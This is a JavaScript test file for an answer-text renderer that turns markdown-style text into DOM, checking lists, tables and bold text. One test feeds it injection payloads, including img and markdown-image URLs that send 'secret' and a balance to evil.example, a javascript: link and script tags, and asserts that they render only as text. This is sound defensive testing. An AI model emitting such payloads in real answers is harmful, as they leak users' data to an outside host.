import { renderAnswer } from './answer-text.js';

const render = (text) => {
    const div = document.createElement('div');
    div.append(renderAnswer(text));
    return div;
};

describe('the answer text', () => {
    it('lays out paragraphs, lists, tables, bold and code', () => {
        const div = render([
            '**Since 1 January** the value went up.',
            '',
            '- Money in: `145 008` NOK',
            '- Money out: 139 064 NOK',
            '',
            '1. first',
            '2. second',
            '',
            '| Gained most | NOK |',
            '|---|---:|',
            '| BTC | +610 |',
            '| ZEC | +297 |',
            '',
            '## Left out',
            'line one',
            'line two',
        ].join('\n'));
        expect(div.querySelector('p strong').textContent).to.equal('Since 1 January');
        expect([...div.querySelectorAll('ul li')].map((li) => li.textContent)).to.deep.equal(['Money in: 145 008 NOK', 'Money out: 139 064 NOK']);
        expect(div.querySelector('ul code').textContent).to.equal('145 008');
        expect(div.querySelectorAll('ol li').length).to.equal(2);
        expect([...div.querySelectorAll('thead th')].map((th) => th.textContent)).to.deep.equal(['Gained most', 'NOK']);
        expect([...div.querySelectorAll('tbody tr')].map((tr) => tr.textContent)).to.deep.equal(['BTC+610', 'ZEC+297']);
        expect(div.textContent).not.to.contain('---');
        expect(div.textContent).not.to.contain('**');
        const last = div.querySelectorAll('p')[2];
        expect(last.querySelectorAll('br').length).to.equal(1);
        expect(div.querySelectorAll('p')[1].textContent).to.equal('Left out');
    });

    it('never turns the answer into markup, links or images', () => {
        const div = render([
            '<img src="https://evil.example/x?d=secret" onerror="alert(1)">',
            '![data](https://evil.example/leak?balance=213073)',
            '[click](javascript:alert(1)) and **<b>bold</b>**',
            '| <script>x()</script> | <a href="https://evil.example">a</a> |',
        ].join('\n'));
        expect(div.querySelector('img, script, a, b, iframe')).to.equal(null);
        expect(div.textContent).to.contain('<img src="https://evil.example/x?d=secret"');
        expect(div.textContent).to.contain('![data](https://evil.example/leak?balance=213073)');
        expect(div.querySelector('strong').textContent).to.equal('<b>bold</b>');
        expect(div.querySelector('td').textContent).to.equal('<script>x()</script>');
    });

    it('keeps text that is no block as it is', () => {
        expect(render('just text').textContent).to.equal('just text');
        expect(render('').childElementCount).to.equal(0);
        expect(render('a ** b').textContent).to.equal('a ** b');
    });
});
